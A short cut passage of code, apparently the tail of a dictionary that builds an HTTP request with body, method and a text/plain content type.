            "body": body,
            "method": method,
            "content_type": "text/plain"
        }
